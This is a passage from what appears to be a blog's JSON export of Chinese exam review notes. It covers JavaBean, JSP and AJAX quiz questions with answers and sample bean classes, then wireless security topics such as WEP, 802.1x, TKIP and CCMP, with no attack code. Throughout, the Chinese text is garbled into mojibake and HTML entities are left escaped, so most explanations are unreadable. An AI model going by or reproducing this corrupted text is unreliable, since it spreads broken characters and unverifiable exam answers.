stuname;&#125;&#125; 1.JavaBeanåº”è¯¥æ˜¯publicç±»ï¼Œä¸”å…·æœ‰æ— å‚æ•°çš„publicæ„é€ æ–¹æ³•ã€‚ä¹Ÿå¯ä»¥å®šä¹‰å¸¦å‚æ•°æ„é€ æ–¹æ³•ã€‚ 2.ç±»çš„æˆå‘˜å˜é‡ä¸€èˆ¬ç§°ä¸ºå±æ€§ï¼ˆpropertyï¼‰ï¼Œå¯¹æ¯ä¸ªå±æ€§è®¿é—®æƒé™ä¸€èˆ¬å®šä¹‰ä¸ºprivateï¼Œå±æ€§åå¿…é¡»ä»¥å°å†™å­—æ¯å¼€å¤´ã€‚ 3.æ¯ä¸ªå±æ€§é€šå¸¸å®šä¹‰ä¸¤ä¸ªpublicæ–¹æ³•ï¼Œä¸€ä¸ªæ˜¯è®¿é—®æ–¹æ³•ï¼ˆgetterï¼‰ï¼Œä¸€ä¸ªæ˜¯ä¿®æ”¹æ–¹æ³•ï¼ˆsetterï¼‰ï¼Œä½¿ç”¨å®ƒä»¬è®¿é—®å’Œä¿®æ”¹JavaBeansçš„å±æ€§å€¼ï¼Œå¯¹åº”çš„å˜é‡é¦–å­—æ¯å¿…é¡»å¤§å†™ã€‚ ç¬¬2è¡Œï¼špublic class Student{&#x2F;&#x2F;åº”è¯¥æ˜¯publicç±»ã€‚ ç¬¬4è¡Œï¼špublic String getStuname(){&#x2F;&#x2F;è®¿é—®æ–¹æ³•getterå¯¹åº”çš„å˜é‡é¦–å­—æ¯å¿…é¡»å¤§å†™ã€‚ ç¬¬6è¡Œï¼špublic void setStuname(String stuname){&#x2F;&#x2F;ä¿®æ”¹æ–¹æ³•setterï¼Œåº”è¯¥æ˜¯setStuname(String stuname)ã€‚ å¦‚æœå·²ç»åœ¨åŒ…beané‡Œæ­£ç¡®å®šä¹‰äº†ä¸€ä¸ªJavaBeanç±»Rose.javaï¼Œé€šè¿‡ä»¥ä¸‹JSPä»£ç èƒ½ä¸èƒ½æ­£ç¡®è®¿é—®beanï¼Œå¦‚æœä¸èƒ½ä»¥ä¸‹å“ªé¡¹ä¿®æ”¹æ˜¯æ­£ç¡®çš„ï¼ˆï¼‰ã€‚ 12345678910111 &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;2 &lt;jsp:useBean id=&quot;rose&quot; type=&quot;bean.Rose&quot; scope=&quot;session&quot;/&gt;3 &lt;p&gt;çŸ©å½¢çš„é•¿æ˜¯ï¼š&lt;%=rose.getLength()%&gt;4 &lt;p&gt;çŸ©å½¢çš„å®½æ˜¯ï¼š&lt;%=rose.getWidth()%&gt;5 &lt;p&gt;çŸ©å½¢çš„é¢ç§¯æ˜¯ï¼š&lt;%=rose.computerArea()%&gt;6 &lt;p&gt;çŸ©å½¢çš„å‘¨é•¿æ˜¯ï¼š&lt;%=rose.computerLength()%&gt; typeå±æ€§å¿…é¡»ä¿è¯beanå®ä¾‹å­˜åœ¨ï¼Œå¦‚æœæ‰¾åˆ°ç”¨roseæŒ‡å‘å®ƒï¼Œå¦‚æœæ‰¾ä¸åˆ°äº§ç”ŸInstantiationå¼‚å¸¸ï¼ŒbeanName&#x3D;â€bean.Roseâ€;å¯ä»¥åŠ¨æ€å®ä¾‹åŒ–ã€‚ ç¬¬2è¡ŒåŠ å…¥åŠ¨ä½œæ ‡è®°useBeanå±æ€§beanNameå³å¯ï¼šã€‚ ä¸èƒ½è®¿é—®beanï¼Œåº”è¯¥åœ¨ç¬¬2è¡ŒåŠ å…¥åŠ¨ä½œæ ‡è®°useBeanå±æ€§ï¼›beanName = &quot;bean.Rose&quot; ä¸‹é¢è¯­å¥ä¸&lt;jsp:getProperty name=â€tomâ€ property=â€jerryâ€/&gt;ç­‰ä»·çš„æ˜¯ï¼ˆï¼‰ &lt;%out.print(tom.getJerry());%&gt; å…³äºjsp:setPropertyå’Œjsp:getPropertyæ ‡è®°çš„æè¿°ä»¥ä¸‹æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ è¿™ä¸¤ä¸ªæ ‡è®°çš„nameå±æ€§å€¼å¿…é¡»ä¸&lt;jsp:useBean&gt;æ ‡è®°çš„idå±æ€§å€¼ç›¸å¯¹åº” student.jspæ–‡ä»¶ä»£ç å¦‚ä¸‹ï¼Œè¦ä½¿studentä¸€ç›´å­˜åœ¨äºä¼šè¯ä¸­ï¼Œç›´åˆ°ç»ˆæ­¢æˆ–è¢«åˆ é™¤ä¸ºæ­¢ï¼Œè¯·è¡¥å…¨ä»£ç ï¼ˆï¼‰ã€‚ 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;jsp:useBean id=&quot;student&quot; class=&quot;bean.Student&quot; scope=&quot; ___session______ &quot; /&gt; &lt;jsp:setProperty property=&quot;stuname&quot; name=&quot;student&quot; value=&quot;rose&quot; /&gt; &lt;html&gt; &lt;body&gt; å­¦ç”Ÿå§“åï¼š &lt;jsp:getProperty name=&quot;student&quot; property=&quot;stuname&quot; /&gt; &lt;/body&gt; &lt;/html&gt; pageé¡µé¢åŸŸï¼Œrequestè¯·æ±‚åŸŸï¼Œsessionä¼šè¯åŸŸï¼Œapplicationåº”ç”¨åŸŸã€‚ ç¬¬åäºŒç«  å…³äºAJAXæŠ€æœ¯ç›¸å…³ç‰¹ç‚¹ï¼Œæè¿°æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ å¯ä»¥ä¿ƒè¿›é¡µé¢å‘ˆç°å’Œæ•°æ®æœ¬èº«åˆ†ç¦» å‡è½»æœåŠ¡å™¨è´Ÿæ‹…ï¼Œé¿å…æ•´ä¸ªæµè§ˆå™¨çª—å£åˆ·æ–°æ—¶é€ æˆçš„é‡å¤è¯·æ±‚ã€‚ å¯¹æµè§ˆå™¨å…·æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå¯¹äºä¸å…¼å®¹çš„æµè§ˆå™¨ï¼Œå¯èƒ½æ— æ³•ä½¿ç”¨ã€‚ AJAXæ²¡æœ‰åˆ·æ–°é¡µé¢ï¼Œæµè§ˆå™¨ä¸Šçš„â€œåé€€â€æŒ‰é’®æ˜¯å¤±æ•ˆçš„ï¼Œä¸èƒ½é€€å›ã€‚ ç°æœ‰ä»¥ä¸‹éƒ¨åˆ†JSä»£ç æ®µï¼Œç”¨æˆ·ä½¿ç”¨IE5æµè§ˆå™¨èƒ½å¦å®ç°å¼‚æ­¥å…åˆ·æ–°ç½‘é¡µï¼Œå¦‚æœä¸èƒ½åº”è¯¥å¦‚ä½•ä¿®æ”¹ï¼ˆï¼‰ã€‚ 1234567891011121 &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;2 function showInfo()&#123;3 var xmlHttp=new XMLHttpRequest(); 4 xmlHttp.open(&quot;POST&quot;, &quot;a.jsp&quot;, true); 5 xmlHttp.onreadystatechange=function() &#123; 6 if (xmlHttp.readyState==4) &#123; 7 infoDiv.innerHTML = xmlHttp.responseText;8 &#125;9 &#125;10 xmlHttp.send(); 11 &#125;12 &lt;/SCRIPT&gt; ä¸èƒ½å®ç°å¼‚æ­¥å…åˆ·æ–°ç½‘é¡µï¼Œç¬¬ä¸‰è¡Œæ”¹ä¸º 1var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) æ‰€æœ‰ç°ä»£æµè§ˆå™¨ï¼ˆIE7+ã€Firefoxã€Chromeã€Safari ä»¥åŠ Operaï¼‰å‡æ”¯æŒXMLHttpRequest å¯¹è±¡var xmlHttp&#x3D;new XMLHttpRequest(); è€ç‰ˆæœ¬çš„Internet Explorerï¼ˆIE5 å’Œ IE6ï¼‰ä½¿ç”¨ActiveXObjectå¯¹è±¡, var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) éƒ¨åˆ†åˆ†æHTTPè¯·æ±‚å’Œå“åº”çš„æœåŠ¡å™¨çŠ¶æ€JSä»£ç å¦‚ä¸‹ï¼Œå½“å¤„äºåˆå§‹åŒ–çŠ¶æ€æ—¶åœ¨å®¢æˆ·ç«¯é¡µé¢ä¸Šæ‰“å°çš„readyStateå±æ€§å€¼ä¸ºï¼ˆï¼‰ã€‚ ä¸ä¼šæœ‰æ‰“å°æ•°æ® 123456789101112131415161718192021&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt; var xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); function showInfo() &#123; xmlHttp.open(&quot;GET&quot;, &quot;c.jsp&quot;, true); xmlHttp.onreadystatechange = showState; xmlHttp.send(); &#125; function showState() &#123; document.writeln(xmlHttp.readyState); &#125;&lt;/SCRIPT&gt; æœåŠ¡å™¨åœ¨åˆå§‹åŒ–çŠ¶æ€æ—¶è¿˜æ²¡æœ‰å’Œå®¢æˆ·ç«¯å»ºç«‹è¿æ¥ï¼Œæ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯Httpè¯·æ±‚ï¼Œæ‰€ä»¥ä¸ä¼šæ‰§è¡ŒshowStateå‡½æ•°ï¼Œä¸ä¼šæœ‰æ‰“å°æ•°æ®åœ¨å®¢æˆ·ç«¯é¡µé¢ã€‚ ä½¿ç”¨AJAXæŠ€æœ¯è·³è½¬åˆ°a.jspé¡µé¢éƒ¨åˆ†ä»£ç æ®µå¦‚ä¸‹ï¼ŒæœåŠ¡å™¨å“åº”è¿”å›å®¢æˆ·ç«¯çš„ä»£ç ä¸ºinfoDiv.innerText &#x3D; xmlHttp.responseText;è¯·é—®æœ€åå®¢æˆ·ç«¯é¡µé¢è¾“å‡ºå†…å®¹ä¸ºï¼ˆï¼‰ã€‚ 1234567891011a.jsp&lt;table&gt; &lt;tr&gt; &lt;th&gt;åœ°å€ï¼š&lt;br&gt;æˆéƒ½ç†å·¥å¤§å­¦&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; è¾“å‡ºå†…å®¹ä¸º 123456789&lt;table&gt; &lt;tr&gt; &lt;th&gt;åœ°å€ï¼š&lt;br&gt;æˆéƒ½ç†å·¥å¤§å­¦&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; infoDiv.innerTextå±æ€§ï¼Œè¡¨ç¤ºåœ¨è¯¥divå†…æ˜¾ç¤ºå†…å®¹æ—¶ï¼Œä¸è€ƒè™‘å…¶ä¸­çš„HTMLæ ¼å¼çš„æ ‡ç­¾ï¼Œæ‰€æœ‰æ ‡ç­¾éƒ½ä¸ä¼šè§£é‡Šå¹¶åŸæ ·è¾“å‡ºã€‚ éƒ¨åˆ†JSONä»£ç å¦‚ä¸‹ï¼Œè¯·é—®åœ¨å®¢æˆ·ç«¯å¼¹å‡ºçª—å£è¾“å‡ºçš„å†…å®¹ä¾æ¬¡ä¸ºï¼ˆï¼‰ã€‚ 123456789101112131415161718192021222324252627function opJSON()&#123;var stu = &#123;&quot;sno&quot;:&quot;20190101&quot;,&quot;sname&quot;:&quot;Tom&quot;,&quot;hobby&quot;:[&quot;ç¯®çƒ&quot;,&quot;è¶³çƒ&quot;,â€æ’çƒâ€],&quot;college&quot;:&#123;&quot;cname&quot;:&quot;æˆéƒ½ç†å·¥å¤§å­¦&quot;,&quot;city&quot;:&quot;æˆéƒ½&quot;&#125;&#125;;alert(stu.sname);alert(stu.hobby[3]);alert(stu.college.city);&#125; è¾“å‡ºï¼šTomundefinedæˆéƒ½ æ•°ç»„ä»0å¼€å§‹ï¼Œhobby[3]æ˜¯æ²¡æœ‰çš„ï¼Œå› ä¸ºç¯®çƒè¶³çƒæ’çƒæ˜¯012 å®éªŒç¬¬åç« 12345678910111213141516171819202122232425262728293031323334353637383940414243package Bean;//åº“ä¸ºBean//é¢˜ç›®ï¼šç¼–å†™ä¸€ä¸ªJavaBeanâ€œBook.javaâ€// å®ƒå«æœ‰å±æ€§bookid(String)ã€bookname(String)ã€bookprice(double)ï¼Œ// å¹¶ç¼–å†™getterã€setterå‚æ•°ã€‚//è§£æå¦‚ä¸‹ï¼š//javabeanä¸­ä¸ä»…è¦å®šä¹‰æˆå‘˜å˜é‡ï¼Œè¿˜æœ‰å¯¹æ¯ä¸€ä¸ªæˆå‘˜å˜é‡å®šä¹‰ä¸€ä¸ªgetteræ–¹æ³•å’Œsetteræ–¹æ³•ã€‚//æˆå‘˜å˜é‡å¿…é¡»æ˜¯privateçš„ï¼Œgetterå’Œsetterå‡½æ•°å¿…é¡»æ˜¯publicçš„//getterå’Œsetteræ–¹æ³•è¯»/å†™å˜é‡çš„å€¼ï¼Œå¯¹åº”å˜é‡çš„é¦–å­—æ¯å¿…é¡»å¤§å†™ï¼Œå¦‚ä¸‹åˆ—å‡½æ•°åï¼š// setBookid()/getBookid()ã€ setBookname()/getBookname()ã€setBookprice()/getBookprice()public class Book &#123; private String bookid ; private String bookname; private Double bookprice; //javabeanä¸­ï¼Œæˆå‘˜å˜é‡å¿…é¡»æ˜¯privateçš„ï¼Œgetterå’Œsetterå‡½æ•°å¿…é¡»æ˜¯publicçš„ //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡bookidçš„setterå’Œgetterå‡½æ•°ã€‚ public void setBookid(String bookid)&#123; this.bookid=bookid;//è®¾ç½®bookidçš„å€¼ return; &#125; public String getBookid()&#123; return bookid; &#125;//è·å–bookidçš„å€¼ //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡booknameçš„setterå’Œgetterå‡½æ•°ã€‚ public void setBookname(String bookname)&#123; this.bookname=bookname;//è®¾ç½®booknameçš„å€¼ return; &#125; public String getBookname()&#123; return bookname; &#125;//è·å–booknameçš„å€¼ //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡bookpriceçš„setterå’Œgetterå‡½æ•°ã€‚ public void setBookprice(Double bookprice)&#123; this.bookprice=bookprice;//è®¾ç½®bookpriceçš„å€¼ return ; &#125; public Double getBookprice()&#123; return bookprice; &#125;//è·å–bookpriceçš„å€¼&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package Bean;//2ï¼šç¼–å†™ä¸€ä¸ªJavaBean&quot;Customer.java&quot;ï¼Œ// å®ƒå«æœ‰å±æ€§account(String)ã€password(String)ã€cname(String)ï¼Œ// ç»™è¿™ä¸ªJavaBeanå¢åŠ å±æ€§member(booleanç±»å‹ï¼Œè¡¨ç¤ºæ˜¯å¦ä¸ºä¼šå‘˜ï¼‰ï¼Œå¹¶ç¼–å†™ç›¸åº”å‡½æ•°ï¼Œå³setter/getterå‡½æ•°ã€‚//è§£æå¦‚ä¸‹ï¼š//javabeanä¸­ä¸ä»…è¦å®šä¹‰æˆå‘˜å˜é‡ï¼Œè¿˜æœ‰å¯¹æ¯ä¸€ä¸ªæˆå‘˜å˜é‡å®šä¹‰ä¸€ä¸ªgetteræ–¹æ³•å’Œsetteræ–¹æ³•ã€‚//æˆå‘˜å˜é‡å¿…é¡»æ˜¯privateçš„ï¼Œgetterå’Œsetterå‡½æ•°å¿…é¡»æ˜¯publicçš„//getterå’Œsetteræ–¹æ³•è¯»/å†™å˜é‡çš„å€¼ï¼Œå¯¹åº”å˜é‡çš„é¦–å­—æ¯å¿…é¡»å¤§å†™ï¼Œå¦‚ä¸‹åˆ—å‡½æ•°åï¼š// setAccount()/getAccount()ã€ setPassword()/getPassword()ã€setCname()/getCname()//å¯¹äºç‰¹æ®Šçš„å¸ƒå°”å‹çš„æˆå‘˜å˜é‡memberï¼Œéœ€è¦æŠŠgetteræ–¹æ³•çš„å‡½æ•°è®¾ç½®ä¸ºä»¥iså¼€å¤´çš„ï¼Œæœ¬ä¾‹ä¸­è®¾ç½®ä¸ºisMember().public class Customer &#123; private String account; private String password; private String cname; private boolean member; //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡accountçš„setterå’Œgetterå‡½æ•°ã€‚ public void setAccount(String account)&#123; this.account=account; return; &#125; public String getAccount()&#123; return account; &#125; //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡passwordçš„setterå’Œgetterå‡½æ•°ã€‚ public void setPassword(String password)&#123; this.password=password;return; &#125; public String getPassword()&#123; return password; &#125; //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡cnameçš„setterå’Œgetterå‡½æ•°ã€‚ public void setCname(String cname)&#123; this.cname=cname;return; &#125; public String getCname()&#123; return cname; &#125; //ä¸‹é¢ä¸¤ä¸ªæ˜¯å˜é‡memberçš„setterå’Œgetterå‡½æ•°ã€‚ public boolean isMember()&#123; return member; &#125; public void setMember(boolean member)&#123; this.member=member; &#125;&#125;","categories":[{"name":"æœŸæœ«è€ƒè¯•","slug":"æœŸæœ«è€ƒè¯•","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"WEBåº”ç”¨å¼€å‘","slug":"æœŸæœ«è€ƒè¯•/WEBåº”ç”¨å¼€å‘","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"æ— çº¿ç½‘ç»œå®‰å…¨æœŸæœ«è€ƒç‚¹","slug":"æ— çº¿ç½‘ç»œå®‰å…¨æœŸæœ«è€ƒç‚¹","date":"2021-06-09T16:40:31.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2021/06/10/æ— çº¿ç½‘ç»œå®‰å…¨æœŸæœ«è€ƒç‚¹/","permalink":"https://gryffinbit.top/2021/06/10/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"ç²¾ç®€ç‰ˆé¢˜å‹1ã€2ã€3ã€6ã€8ç« ä¸€ä¸ªå¤§é¢˜ ç¬¬ä¸€ç« æ— çº¿å±€åŸŸç½‘çš„æ ‡å‡† 802.11 æ— çº¿ç½‘ç»œå®‰å…¨ã€æœ‰çº¿ç½‘ç»œå®‰å…¨çš„åŒºåˆ« å¼€æ”¾æ€§ æ— çº¿ç½‘ç»œå¼€æ”¾æ€§æ›´å¥½ï¼Œå®¹æ˜“è¢«çªƒå¬æˆ–ä¸»åŠ¨å¹²æ‰°ç­‰æ”»å‡» æœ‰çº¿ç½‘ç»œæœ‰ç¡®å®šçš„è¾¹ç•Œï¼Œé€šè¿‡å¯¹ç«¯å£çš„ç®¡ç†ï¼Œèƒ½æœ‰æ•ˆåœ°æ§åˆ¶éæ³•ç”¨æˆ·çš„æ¥å…¥ã€‚ ç§»åŠ¨æ€§ æ— çº¿ç½‘ç»œç§»åŠ¨æ€§ä½¿ç®¡ç†éš¾åº¦å˜å¤§ æœ‰çº¿ç½‘ç»œä¸èƒ½åœ¨å¤§èŒƒå›´å†…ç§»åŠ¨ï¼Œç®¡ç†å®¹æ˜“ å¥å£®æ€§ æ— çº¿ç½‘ç»œä¼ è¾“ä¸ç¨³å®šï¼Œå¥å£®æ€§å·® æœ‰çº¿ä¼ è¾“ç¯å¢ƒå›ºå®šï¼Œä¿¡å·è´¨é‡ç¨³å®š çµæ´»æ€§ æ— çº¿ç½‘ç»œæ›´çµæ´»ï¼Œä½†æ˜¯è¦æ›´åŠ ä¿¡ä»»çš„å…³ç³» æœ‰çº¿ç½‘ç»œçµæ´»æ€§ä¸å¥½ï¼Œä½†æ˜¯å®‰å…¨æ€§æ›´å¥½ æ‹“æ‰‘ç»“æ„ æ— çº¿ç½‘ç»œåŠ¨æ€å˜åŒ–çš„æ‹“æ‰‘ç»“æ„ï¼Œå®‰å…¨æŠ€æœ¯å’Œæ–¹æ¡ˆéƒ¨ç½²éš¾ æœ‰çº¿ç½‘ç»œå›ºå®šçš„æ‹“æ‰‘ç»“æ„ï¼Œå®‰å…¨æŠ€æœ¯å’Œæ–¹æ¡ˆéƒ¨ç½²å®¹æ˜“ è®¾å¤‡ æ— çº¿ç½‘ç»œè®¾å¤‡â‘  æ›´å®¹æ˜“è¢«ç‰©ç†æ”»å‡»ã€‚ â‘¡ å¯èƒ½å­˜åœ¨å‡APã€‚ â‘¢ èµ„æºå—é™ æœ‰çº¿ç½‘ç»œè®¾å¤‡ï¼Œè·¯ç”±å™¨ã€é˜²ç«å¢™ç­‰ï¼Œä¸å®¹æ˜“è¢«ç‰©ç†æ”»å‡» ç¬¬äºŒç« WEP åè¯è§£é‡Šï¼š WEP (Wired Equivalent Privacy) æœ‰çº¿ç­‰æ•ˆä¿å¯† STAï¼šç§»åŠ¨ç«™ã€APï¼šæ— çº¿æ¥å…¥ç‚¹ IV (Initialized Vector) åˆå§‹åŒ–çŸ¢é‡ C å¯†æ–‡ã€P æ˜æ–‡ã€Key å¯†é’¥ ICV (Integrity Check Value) å®Œæ•´æ€§æ ¡éªŒå’Œ RC4 (Rivest Cipher 4) å¯¹ç§°åŠ å¯†ç®—æ³•ï¼ŒæµåŠ å¯†ç®—æ³• WEPè®¾è®¡æ€æƒ³ï¼š æœºå¯†æ€§ï¼šRC4åºåˆ—å¯†ç  å¯ç”¨æ€§ï¼šStationä¸APå…±äº«åŒä¸€å¯†é’¥å®æ–½æ¥å…¥æ§åˆ¶ï¼› å®Œæ•´æ€§ï¼šCRC-32å¾ªç¯å†—ä½™æ ¡éªŒå€¼ åŠ å¯†æ–¹å¼ï¼š$$ RC4ï¼ˆIV,key)\\bigoplusï¼ˆP,ICVï¼‰ $$ è®¡ç®—æ˜æ–‡æ•°æ®çš„CRC-32å†—ä½™æ ¡éªŒç å’Œæ˜æ–‡ä¸€èµ·æ„æˆä¼ è¾“è½½è·ã€‚ Stationå’ŒAPå…±äº«å¯†é’¥Keyã€‚é€‰å®šä¸€ä¸ªåˆå§‹åŒ–çŸ¢é‡IV å°†IVå’ŒKeyè¿æ¥èµ·æ¥æ„æˆç§å­å¯†é’¥ï¼Œé€å…¥RC4ç®—æ³•çš„ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œäº§ç”Ÿå¯†é’¥æµ åŠ å¯†å¯†é’¥æµä¸ä¼ è¾“è½½è·å¼‚æˆ–ï¼Œæ„æˆå¯†æ–‡C è§£å¯†æ–¹å¼ï¼š$$ ï¼ˆP,ICVï¼‰&#x3D;C\\bigoplus RC4ï¼ˆIV,key) $$ IVæ˜æ–‡å½¢å¼å’ŒCä¸€èµ·å‘é€ æ¥æ”¶æ–¹ä»æ•°æ®åŒ…æå–IVå’ŒCï¼Œå°†IVå’Œkeyä¸€èµ·é€å…¥RC4ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ï¼Œå¾—åˆ°è§£å¯†å¯†é’¥æµ è§£å¯†å¯†é’¥æµå’ŒCå¼‚æˆ–ï¼Œå¾—åˆ°æ˜æ–‡På’ŒCRCæ ¡éªŒå’ŒICV WEPè§„å®šäº†ä¸¤ç§è®¤è¯æ–¹å¼ å¼€æ”¾ç³»ç»Ÿè®¤è¯ ä¸è¿›è¡Œç”¨æˆ·è®¤è¯ï¼Œä»»ä½•æ¥å…¥WLANçš„è¯·æ±‚éƒ½è¢«å…è®¸ å…±äº«å¯†é’¥è®¤è¯ é€šè¿‡æ£€éªŒAPå’ŒStationæ˜¯å¦å…±äº«åŒä¸€å¯†é’¥æ¥å®ç°çš„ï¼ˆWEPåŠ å¯†å¯†é’¥ï¼‰ 802.1xåè®® åŸºäºç«¯å£çš„è®¿é—®æ§åˆ¶åè®® å®šä¹‰äº†ä¸¤ç±»åè®®æ¥å…¥å®ä½“ è®¤è¯è¯·æ±‚è€… è®¤è¯è€… ä½“ç³»ç»“æ„é‡Œåˆ†äº†ä¸‰ä¸ªç»„æˆéƒ¨åˆ† ç”³è¯·è€…ç³»ç»Ÿ è®¤è¯è€…ç³»ç»Ÿ è®¤è¯æœåŠ¡å™¨ è®¤è¯è€…ç³»ç»Ÿå¯¹åº”äºä¸åŒç”¨æˆ·çš„ç«¯å£ï¼Œæœ‰ä¸¤ä¸ªé€»è¾‘ç«¯å£ å—æ§ç«¯å£ï¼šåªåœ¨è®¤è¯é€šè¿‡çš„çŠ¶æ€ä¸‹æ‰æ‰“å¼€ï¼Œç”¨äºä¼ é€’ç½‘ç»œèµ„æºå’ŒæœåŠ¡ éå—æ§ç«¯å£ï¼šå§‹ç»ˆå¤„äºåŒå‘è¿é€šçŠ¶æ€ï¼Œä¸»è¦ç”¨äºä¼ é€ä¸è®¤è¯ç›¸å…³çš„æ•°æ®å¸§ã€‚ 802.1xçš„è®¤è¯æµç¨‹ ç”³è¯·è€…å‘å‡ºè¯·æ±‚è®¤è¯æŠ¥æ–‡EAPOL-start è®¤è¯è€…æ”¶åˆ°æ¶ˆæ¯åå‘ç”³è¯·è€…å‘é€EAP-Request&#x2F;Identityï¼Œè¦æ±‚æä¾›è®¤è¯ä¿¡æ¯ ç”³è¯·è€…å“åº”è¯·æ±‚ï¼Œå‘é€ç”¨æˆ·åä¿¡æ¯ç»™è®¤è¯è€…ã€‚ è®¤è¯è€…å°†æ•°æ®å°åŒ…å¤„ç†å‘ç»™è®¤è¯æœåŠ¡å™¨ã€‚ è®¤è¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œä¸æ•°æ®åº“ä¸­çš„ç”¨æˆ·åè¡¨è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾åˆ°å¯¹åº”å£ä»¤ä¿¡æ¯å¹¶éšæœºç”ŸæˆåŠ å¯†å­—ï¼Œä¼ ç»™è®¤è¯è€… ç”³è¯·è€…æ”¶åˆ°è®¤è¯è€…ä¼ æ¥çš„åŠ å¯†å­—åï¼Œç”¨å…¶å¯¹å£ä»¤éƒ¨åˆ†åŠ å¯†ï¼Œäº¤ç»™è®¤è¯è€…ã€‚ è®¤è¯è€…å†ä¼ ç»™è®¤è¯æœåŠ¡å™¨ è®¤è¯æœåŠ¡å™¨æ”¶åˆ°åï¼Œä¸è‡ªå·±ç»åŠ å¯†åçš„å£ä»¤è¿›è¡Œå¯¹æ¯”ã€‚æŠŠåé¦ˆä¿¡æ¯ç»™è®¤è¯è€…ã€‚ è®¤è¯è€…å‘å‡ºæ‰“å¼€ç«¯å£çš„æŒ‡ä»¤ï¼Œå‘ŠçŸ¥ä¸šåŠ¡æµå¯é€šè¿‡ç«¯å£è®¿é—®ã€‚å¦åˆ™å¤±è´¥ã€‚ç«¯å£å…³é—­ ç”¨æˆ·è¦æ±‚æ–­å¼€ç½‘ç»œæ—¶ï¼Œå‘é€æ–­ç½‘è¯·æ±‚ã€‚è®¤è¯è€…æŠŠç«¯å£è®¾ç½®ä¸ºéæˆæƒçŠ¶æ€ 802.1xè®¤è¯ç‰¹ç‚¹ åè®®å®ç°ç®€å•ï¼ŒäºŒå±‚åè®®ï¼Œå¯¹è®¾å¤‡æ€§èƒ½è¦æ±‚ä¸é«˜ é‡‡ç”¨å—æ§ç«¯å£å’Œä¸å—æ§ç«¯å£çš„é€»è¾‘åŠŸèƒ½ï¼Œå°†ä¸šåŠ¡ä¸è®¤è¯åˆ†ç¦»ï¼Œç®€åŒ–äº†å¤æ‚è¿‡ç¨‹ï¼Œæé«˜äº†å°è£…æ•ˆç‡ ä¸å¯¹ç§°åè®®ï¼Œåªèƒ½ç½‘ç»œé‰´åˆ«ç”¨æˆ·ï¼Œä¸èƒ½åŒå‘é‰´åˆ«ï¼Œæœ‰å®‰å…¨éšæ‚£ WAPIåè®®ï¼ˆå¤§æ¦‚äº†è§£æ¦‚å¿µï¼‰ åŸºäºå…¬é’¥æŠ€æœ¯å®ç°åŸºç«™å’Œè®¿é—®æ¥å…¥ç‚¹ä¸¤è€…çš„èº«ä»½éªŒè¯ åˆæ³•çš„ç”¨æˆ·æ¥å…¥åˆæ³•çš„ç½‘ç»œ åˆ†ä¸ºæ— çº¿å±€åŸŸç½‘é‰´åˆ«åŸºç¡€ç»“æ„å’Œæ— çº¿å±€åŸŸç½‘ä¿å¯†åŸºç¡€ç»“æ„ 802.11 i åè®® RSNçš„æ¦‚å¿µ ï¼ˆRobust Security Networkï¼‰å¼ºå¥ç½‘ç»œå®‰å…¨ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æé«˜æ— çº¿ç½‘ç»œçš„å®‰å…¨æ€§ã€‚ TKIP (Temporal Key Integrity Protocol) ä¸´æ—¶ç§˜é’¥å®Œæ•´æ€§åè®® ç”¨åŠ å¯†æ··åˆå‡½æ•°æ¥å¤„ç†åˆå§‹å‘é‡è¿‡å¼±æˆ–ç©ºé—´è¿‡å°çš„é—®é¢˜ã€‚ RC4æµåŠ å¯†ï¼Œå¯†é’¥é•¿åº¦128ï¼Œè§£å†³WEPå¯†é’¥è¿‡çŸ­çš„é—®é¢˜ CCMP (CTR with CBC-MAC Protocol) å¯¹ç§°å¯†é’¥å—å¯†ç æ¨¡å¼ã€‚ åœ¨AESçš„CCMæ¨¡å¼ä¸Šæ”¹è¿›æ¥çš„ã€‚ ä½¿ç”¨AESå—åŠ å¯†ç®—æ³• å–ä»£TKIPå’ŒWEPã€‚ å› ä¸ºAESåŠ å¯†ç®—æ³•æ˜¯å’Œå¤„ç†å™¨ç›¸è”ç³»çš„ï¼Œæ‰€ä»¥æ—§çš„è®¾å¤‡ä¸­å¯ä»¥æ”¯æŒWEPå’ŒTKIPï¼Œä½†æ˜¯ä¸èƒ½æ”¯æŒCCMP&#x2F;AESåŠ å¯† TKIPå’ŒCCMPåŒºåˆ« TKIPåŸºäºRC4ã€‚CCMPåŸºäºAESç®—æ³•ï¼Œéœ€è¦ç¡¬ä»¶æ”¯æŒ TKIPå’ŒWEPå…³ç³» 